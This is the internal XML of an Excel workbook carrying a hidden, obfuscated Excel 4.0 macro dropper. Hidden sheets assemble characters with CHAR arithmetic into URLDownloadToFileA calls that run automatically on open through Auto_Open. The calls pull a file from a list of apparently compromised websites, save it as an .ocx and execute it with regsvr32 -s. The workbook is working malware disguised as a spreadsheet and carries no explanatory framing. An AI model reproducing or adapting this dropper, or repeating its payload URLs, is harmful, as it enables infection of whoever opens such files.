
<file path=[Content_Types].xml><?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"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sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
  <Override PartName="/xl/macrosheets/intlsheet1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/>
  <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="x15">
      <x15ac:absPath xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" url="C:\Users\Posik\Desktop\File3\20m\ZV\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{2C07E042-0301-406E-905A-0AB33B0310B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Vrgwg" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Kvrbdf" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet name="Evtb" sheetId="4" state="hidden" r:id="rId4"/>
    <sheet name="RVv" sheetId="5" state="hidden" r:id="rId5"/>
    <sheet name="EGVSBSR" sheetId="6" state="hidden" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="UVCE1">EGVSBSR!$C$16</definedName>
    <definedName name="UVCE2">EGVSBSR!$C$18</definedName>
    <definedName name="UVCE3">EGVSBSR!$C$20</definedName>
    <definedName name="UVCE4">EGVSBSR!$C$22</definedName>
    <definedName name="UVCE5">EGVSBSR!$C$24</definedName>
    <definedName name="UVCE6">EGVSBSR!$C$26</definedName>
    <definedName name="UVCE7">EGVSBSR!$C$28</definedName>
    <definedName name="_xlnm.Auto_Open">EGVSBSR!$C$1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32" i="4" l="1"/>
  <c r="C12" i="3"/>
  <c r="Q15" i="3"/>
  <c r="D16" i="4"/>
  <c r="Q20" i="4"/>
  <c r="H14" i="3"/>
  <c r="I4" i="3"/>
  <c r="M9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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="20" uniqueCount="20">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>t</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>regsvr32.exe</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t>SysWow64\</t>
  </si>
  <si>
    <t>\Windows\</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>,0,</t>
  </si>
  <si>
    <t>w"&amp;"ww.rivabodrumresort.com/eski_site/HozRXt/","</t>
  </si>
  <si>
    <t>w"&amp;"ww.iinil.com/phpmyadmin/oWnF6m7JoN/","</t>
  </si>
  <si>
    <t>britainsolicitors.com/wp-admin/OshgKKcJ3I/","</t>
  </si>
  <si>
    <t>test.ezzclinics.com/elxaji0/BnqhzGnKzDEi01/","</t>
  </si>
  <si>
    <t>britspizzeria.com/cgi-bin/WRo/","</t>
  </si>
  <si>
    <t>trainingeighteen.co.zw/wp-content/f1Q3/","</t>
  </si>
  <si>
    <t>thiendoan.com/venmo/Mp1r/","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</si>
</sst>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9B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2" fillId="0" borderId="0" xfId="1" applyFont="1"/>
    <xf numFmtId="0" fontId="3" fillId="2" borderId="0" xfId="0" applyFont="1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xlIntlMacrosheet" Target="macrosheets/intlsheet1.xml"/><Relationship Id="rId5" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet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393672</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>276224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FEE6376C-0F57-4BD1-9220-1410000BD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318472" cy="276224"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
      </xdr:spPr>
    </xdr:pic>
    <xdr:clientData/>
  </xdr:twoCellAnchor>
</xdr:wsDr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A26DF10D-E36F-44B8-A275-7FB78518770E}">
  <dimension ref="C13"/>
  <sheetViews>
    <sheetView showFormulas="1" topLeftCell="A7" workbookViewId="0">
      <selection activeCell="B11" sqref="B11"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="3" max="3" width="255.7109375" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="13" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C13" t="b">
        <f>FORMULA(Vrgwg!P22&amp;Vrgwg!H9&amp;Vrgwg!L2&amp;Vrgwg!B15&amp;Vrgwg!B15&amp;Kvrbdf!M9&amp;Kvrbdf!I4&amp;Evtb!K32&amp;Kvrbdf!C12&amp;Vrgwg!H4&amp;Vrgwg!L2&amp;Kvrbdf!H14&amp;Evtb!I22&amp;RVv!C12&amp;Kvrbdf!F20&amp;Evtb!Q20&amp;RVv!G4&amp;Evtb!E21,C16)=FORMULA(Vrgwg!P22&amp;Vrgwg!J11&amp;Vrgwg!B18&amp;Vrgwg!P11&amp;"UVCE1"&amp;Evtb!P10&amp;Vrgwg!H9&amp;Vrgwg!L2&amp;Vrgwg!B15&amp;Vrgwg!B15&amp;Kvrbdf!M9&amp;Kvrbdf!I4&amp;Evtb!K32&amp;Kvrbdf!C12&amp;Vrgwg!H4&amp;Vrgwg!L2&amp;Kvrbdf!H14&amp;Evtb!I22&amp;RVv!C12&amp;Kvrbdf!G21&amp;Evtb!Q20&amp;RVv!G4&amp;Evtb!E21&amp;Vrgwg!P13,C18)=FORMULA(Vrgwg!P22&amp;Vrgwg!J11&amp;Vrgwg!B18&amp;Vrgwg!P11&amp;"UVCE2"&amp;Evtb!P10&amp;Vrgwg!H9&amp;Vrgwg!L2&amp;Vrgwg!B15&amp;Vrgwg!B15&amp;Kvrbdf!M9&amp;Kvrbdf!I4&amp;Evtb!K32&amp;Kvrbdf!C12&amp;Vrgwg!H4&amp;Vrgwg!L2&amp;Kvrbdf!H14&amp;Evtb!I22&amp;RVv!C12&amp;Kvrbdf!H20&amp;Evtb!Q20&amp;RVv!G4&amp;Evtb!E21&amp;Vrgwg!P13,C20)=FORMULA(Vrgwg!P22&amp;Vrgwg!J11&amp;Vrgwg!B18&amp;Vrgwg!P11&amp;"UVCE3"&amp;Evtb!P10&amp;Vrgwg!H9&amp;Vrgwg!L2&amp;Vrgwg!B15&amp;Vrgwg!B15&amp;Kvrbdf!M9&amp;Kvrbdf!I4&amp;Evtb!K32&amp;Kvrbdf!C12&amp;Vrgwg!H4&amp;Vrgwg!L2&amp;Kvrbdf!H14&amp;Evtb!I22&amp;RVv!C12&amp;Kvrbdf!I21&amp;Evtb!Q20&amp;RVv!G4&amp;Evtb!E21&amp;Vrgwg!P13,C22)=FORMULA(Vrgwg!P22&amp;Vrgwg!J11&amp;Vrgwg!B18&amp;Vrgwg!P11&amp;"UVCE4"&amp;Evtb!P10&amp;Vrgwg!H9&amp;Vrgwg!L2&amp;Vrgwg!B15&amp;Vrgwg!B15&amp;Kvrbdf!M9&amp;Kvrbdf!I4&amp;Evtb!K32&amp;Kvrbdf!C12&amp;Vrgwg!H4&amp;Vrgwg!L2&amp;Kvrbdf!H14&amp;Evtb!I22&amp;RVv!C12&amp;Kvrbdf!J20&amp;Evtb!Q20&amp;RVv!G4&amp;Evtb!E21&amp;Vrgwg!P13,C24)=FORMULA(Vrgwg!P22&amp;Vrgwg!J11&amp;Vrgwg!B18&amp;Vrgwg!P11&amp;"UVCE5"&amp;Evtb!P10&amp;Vrgwg!H9&amp;Vrgwg!L2&amp;Vrgwg!B15&amp;Vrgwg!B15&amp;Kvrbdf!M9&amp;Kvrbdf!I4&amp;Evtb!K32&amp;Kvrbdf!C12&amp;Vrgwg!H4&amp;Vrgwg!L2&amp;Kvrbdf!H14&amp;Evtb!I22&amp;RVv!C12&amp;Kvrbdf!K21&amp;Evtb!Q20&amp;RVv!G4&amp;Evtb!E21&amp;Vrgwg!P13,C26)=FORMULA(Vrgwg!P22&amp;Vrgwg!J11&amp;Vrgwg!B18&amp;Vrgwg!P11&amp;"UVCE6"&amp;Evtb!P10&amp;Vrgwg!H9&amp;Vrgwg!L2&amp;Vrgwg!B15&amp;Vrgwg!B15&amp;Kvrbdf!M9&amp;Kvrbdf!I4&amp;Evtb!K32&amp;Kvrbdf!C12&amp;Vrgwg!H4&amp;Vrgwg!L2&amp;Kvrbdf!H14&amp;Evtb!I22&amp;RVv!C12&amp;Kvrbdf!L20&amp;Evtb!Q20&amp;RVv!G4&amp;Evtb!E21&amp;Vrgwg!P13,C28)=FORMULA(Vrgwg!P22&amp;Vrgwg!J11&amp;Vrgwg!B18&amp;Vrgwg!P11&amp;"UVCE7"&amp;Evtb!P10&amp;Vrgwg!H9&amp;Vrgwg!B15&amp;Vrgwg!I17&amp;Vrgwg!I3&amp;Vrgwg!H13&amp;Vrgwg!P11&amp;Vrgwg!K9&amp;Vrgwg!P13&amp;Vrgwg!P7&amp;Vrgwg!P13,C30)=FORMULA(Vrgwg!P22&amp;Vrgwg!H13&amp;Vrgwg!N4&amp;Vrgwg!H13&amp;Vrgwg!H9&amp;Vrgwg!P11&amp;Vrgwg!P15&amp;Vrgwg!H9&amp;Vrgwg!P20&amp;Evtb!L17&amp;Evtb!M13&amp;Evtb!H9&amp;Kvrbdf!Q15&amp;Evtb!D16&amp;RVv!G4&amp;Vrgwg!P15&amp;Vrgwg!P13,C32)=FORMULA(Vrgwg!P22&amp;Vrgwg!G24&amp;Vrgwg!H13&amp;Vrgwg!E6&amp;Vrgwg!E11&amp;Vrgwg!G24&amp;Vrgwg!K23&amp;Vrgwg!P11&amp;Vrgwg!P13,C36)</f>
        <v>1</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
</xm:macrosheet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9885F0DA-859A-4EC4-8023-928BE89544DC}">
  <dimension ref="C4:G12"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection activeCell="H19" sqref="H19"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="4" spans="3:7" x14ac:dyDescent="0.25">
      <c r="G4" t="str">
        <f>CONCATENATE(Vrgwg!P5,Vrgwg!E2,Vrgwg!L11,Vrgwg!G14)</f>
        <v>.ocx</v>
      </c>
    </row>
    <row r="12" spans="3:7" x14ac:dyDescent="0.25">
      <c r="C12" t="str">
        <f>CONCATENATE(Vrgwg!P15,Vrgwg!F19,Vrgwg!L19,Vrgwg!L19,Vrgwg!N17,Vrgwg!M7,Vrgwg!P20,Vrgwg!P27,Vrgwg!P27)</f>
        <v>"https://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AM99" sqref="AM99"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" s="2" customFormat="1" ht="21.7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82C86-0E9F-4523-8475-1556A40265FF}">
  <dimension ref="A2:Q37"/>
  <sheetViews>
    <sheetView topLeftCell="A4" workbookViewId="0">
      <selection activeCell="C7" sqref="C7"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E2" t="str">
        <f>CHAR(113-2)</f>
        <v>o</v>
      </c>
      <c r="G2" t="str">
        <f>CHAR(111-6)</f>
        <v>i</v>
      </c>
      <c r="L2" t="str">
        <f>CHAR(71-6)</f>
        <v>A</v>
      </c>
      <c r="P2" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C3" t="str">
        <f>CHAR(111+3)</f>
        <v>r</v>
      </c>
      <c r="I3" t="str">
        <f>CHAR(87-4)</f>
        <v>S</v>
      </c>
      <c r="P3" t="str">
        <f>CHAR(90+2)</f>
        <v>\</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F4" t="str">
        <f>CHAR(100-18)</f>
        <v>R</v>
      </c>
      <c r="H4" t="str">
        <f>CHAR(110-9)</f>
        <v>e</v>
      </c>
      <c r="K4">
        <v>1</v>
      </c>
      <c r="N4" t="str">
        <f>CHAR(89-1)</f>
        <v>X</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B5" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E6" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D7" t="str">
        <f>CHAR(107+3)</f>
        <v>n</v>
      </c>
      <c r="F7">
        <v>3</v>
      </c>
      <c r="M7" t="str">
        <f>CHAR(117-2)</f>
        <v>s</v>
      </c>
      <c r="P7" t="str">
        <f>CHAR(41+3)</f>
        <v>,</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C9" t="str">
        <f>CHAR(110-2)</f>
        <v>l</v>
      </c>
      <c r="H9" t="str">
        <f>CHAR(70-3)</f>
        <v>C</v>
      </c>
      <c r="K9" t="str">
        <f>CHAR(55-7)</f>
        <v>0</v>
      </c>
      <c r="P9" t="str">
        <f>CHAR(55+5)</f>
        <v>&lt;</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F10" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E11" t="str">
        <f>CHAR(80+5)</f>
        <v>U</v>
      </c>
      <c r="J11" t="str">
        <f>CHAR(80-7)</f>
        <v>I</v>
      </c>
      <c r="L11" t="str">
        <f>CHAR(100-1)</f>
        <v>c</v>
      </c>
      <c r="P11" t="str">
        <f>CHAR(35+5)</f>
        <v>(</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A12" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D13" t="str">
        <f>CHAR(72-4)</f>
        <v>D</v>
      </c>
      <c r="H13" t="str">
        <f>CHAR(68+1)</f>
        <v>E</v>
      </c>
      <c r="N13">
        <v>2</v>
      </c>
      <c r="P13" t="str">
        <f>CHAR(36+5)</f>
        <v>)</v>
      </c>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.25">
      <c r="G14" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B15" t="str">
        <f>CHAR(80-4)</f>
        <v>L</v>
      </c>
      <c r="F15" t="str">
        <f>CHAR(105-5)</f>
        <v>d</v>
      </c>
      <c r="P15" t="str">
        <f>CHAR(31+3)</f>
        <v>"</v>
      </c>
    </row>
    <row r="17" spans="2:16" x14ac:dyDescent="0.25">
      <c r="D17" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" t="s">
        <v>1</v>
      </c>
      <c r="N17" t="s">
        <v>2</v>
      </c>
      <c r="P17" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.25">
      <c r="B18" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.25">
      <c r="F19" t="s">
        <v>3</v>
      </c>
      <c r="L19" t="s">
        <v>4</v>
      </c>
      <c r="P19" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.25">
      <c r="H20">
        <v>8</v>
      </c>
      <c r="P20" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P22" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.25">
      <c r="K23" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.25">
      <c r="G24" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I26" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P27" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I32">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.25">
      <c r="O33">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E35">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q36">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K37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7E2A7-E9F3-460D-9D12-90386F5C0EB8}">
  <dimension ref="C4:Q21"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="E10" sqref="E10"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="4" spans="3:17" x14ac:dyDescent="0.25">
      <c r="I4" t="str">
        <f>T(Vrgwg!E2&amp;Vrgwg!D7&amp;Vrgwg!P15&amp;Vrgwg!P7&amp;Vrgwg!P15&amp;Vrgwg!E11&amp;Vrgwg!F4&amp;Vrgwg!B15&amp;Vrgwg!D13&amp;Vrgwg!E2)</f>
        <v>on","URLDo</v>
      </c>
    </row>
    <row r="9" spans="3:17" x14ac:dyDescent="0.25">
      <c r="M9" t="str">
        <f>T(Vrgwg!P11&amp;Vrgwg!P15&amp;Vrgwg!B5&amp;Vrgwg!C3&amp;Vrgwg!C9&amp;Vrgwg!A12)</f>
        <v>("urlm</v>
      </c>
    </row>
    <row r="12" spans="3:17" x14ac:dyDescent="0.25">
      <c r="C12" t="str">
        <f>T(Vrgwg!E2&amp;Vrgwg!D17&amp;Vrgwg!F15&amp;Vrgwg!E6&amp;Vrgwg!E2&amp;Vrgwg!B18&amp;Vrgwg!G2&amp;Vrgwg!C9)</f>
        <v>oadToFil</v>
      </c>
    </row>
    <row r="14" spans="3:17" x14ac:dyDescent="0.25">
      <c r="H14" t="str">
        <f>T(Vrgwg!P15&amp;Vrgwg!P7&amp;Vrgwg!P15&amp;Vrgwg!J6&amp;Vrgwg!J6&amp;Vrgwg!H9&amp;Vrgwg!H9&amp;Vrgwg!K14&amp;Vrgwg!K14&amp;Vrgwg!P15)</f>
        <v>","JJCCBB"</v>
      </c>
    </row>
    <row r="15" spans="3:17" x14ac:dyDescent="0.25">
      <c r="Q15" t="str">
        <f>T(Vrgwg!P19&amp;Vrgwg!P2&amp;Vrgwg!M7)</f>
        <v xml:space="preserve"> -s</v>
      </c>
    </row>
    <row r="20" spans="6:12" x14ac:dyDescent="0.25">
      <c r="F20" t="s">
        <v>13</v>
      </c>
      <c r="H20" t="s">
        <v>15</v>
      </c>
      <c r="J20" t="s">
        <v>17</v>
      </c>
      <c r="L20" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="21" spans="6:12" x14ac:dyDescent="0.25">
      <c r="G21" t="s">
        <v>14</v>
      </c>
      <c r="I21" t="s">
        <v>16</v>
      </c>
      <c r="K21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DDB13-64BB-423A-87CA-A2224CCCA5A7}">
  <dimension ref="D6:R32"/>
  <sheetViews>
    <sheetView topLeftCell="A3" workbookViewId="0">
      <selection activeCell="K32" sqref="K32"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="6" spans="4:18" x14ac:dyDescent="0.25">
      <c r="R6" s="1"/>
    </row>
    <row r="9" spans="4:18" x14ac:dyDescent="0.25">
      <c r="H9" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="10" spans="4:18" x14ac:dyDescent="0.25">
      <c r="P10" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="13" spans="4:18" x14ac:dyDescent="0.25">
      <c r="M13" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="16" spans="4:18" x14ac:dyDescent="0.25">
      <c r="D16" t="str">
        <f>T(Vrgwg!P19&amp;Vrgwg!P5&amp;Vrgwg!P5&amp;Vrgwg!P3&amp;Vrgwg!G14&amp;Vrgwg!F15&amp;Vrgwg!F19&amp;Vrgwg!D17)</f>
        <v xml:space="preserve"> ..\xdha</v>
      </c>
    </row>
    <row r="17" spans="5:17" x14ac:dyDescent="0.25">
      <c r="L17" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="20" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q20" t="str">
        <f>T(Vrgwg!P5&amp;Vrgwg!P5&amp;Vrgwg!P3&amp;Vrgwg!G14&amp;Vrgwg!F15&amp;Vrgwg!F19&amp;Vrgwg!D17)</f>
        <v>..\xdha</v>
      </c>
    </row>
    <row r="21" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E21" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="22" spans="5:17" x14ac:dyDescent="0.25">
      <c r="I22" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="32" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K32" t="str">
        <f>T(Vrgwg!F10&amp;Vrgwg!D7&amp;Vrgwg!C9)</f>
        <v>wnl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2</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="6" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Vrgwg</vt:lpstr>
      <vt:lpstr>Kvrbdf</vt:lpstr>
      <vt:lpstr>Evtb</vt:lpstr>
      <vt:lpstr>RVv</vt:lpstr>
      <vt:lpstr>EGVSBSR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Posik</dc:creator>
  <cp:lastModifiedBy>Igsberb</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:19:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-03-21T06:29:16Z</dcterms:modified>
</cp:coreProperties>
</file>